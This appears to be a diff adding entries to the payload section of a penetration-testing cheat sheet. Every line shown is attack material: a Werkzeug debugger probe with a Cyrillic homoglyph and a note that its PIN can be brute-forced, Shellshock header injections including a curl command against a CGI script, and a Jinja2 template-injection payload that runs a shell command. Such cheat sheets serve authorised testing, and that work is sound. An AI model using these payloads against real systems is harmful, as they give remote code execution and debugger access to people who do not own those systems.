@@ -57,6 +57,16 @@
 ## Payloads / Probes
 
 ```
+# Werkzeug debugger
+# Supply a string with a homoglyph 'і' (Cyrillic) to force an unhandled exception
+# If debug mode is on, the interactive debugger spawns
+# PIN format: ***-***-*** — brute-forceable when running locally
+strіng
+
+# Shellshock — inject in HTTP headers (User-Agent, Referer, Cookie)
+() { :;}; echo vulnerable
+curl -H "User-Agent: () { :; }; /bin/eject" http://target.com/cgi-bin/test.cgi
+
 # SSTI - Jinja2 RCE
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 
